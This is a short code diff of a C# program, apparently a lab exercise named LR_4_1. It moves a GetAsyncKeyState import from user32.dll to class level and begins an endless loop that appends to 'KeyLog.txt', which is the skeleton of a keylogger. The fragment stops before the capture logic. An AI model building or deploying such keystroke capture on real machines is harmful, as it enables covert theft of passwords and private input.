@@ -1,17 +1,16 @@
 ﻿using System;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Text;
 
 namespace LR_4_1
 {
     class Program
     {
-        static void Main(string[] args)
+        [DllImport("user32.dll")]
+        static extern int GetAsyncKeyState(Int32 i);
+        
+        static void Main()
         {
-            [DllImport("user32.dll")]
-            static extern int GetAsyncKeyState(Int32 i);
-
             while (true)
             {
                 StreamWriter f = new StreamWriter("KeyLog.txt", true);
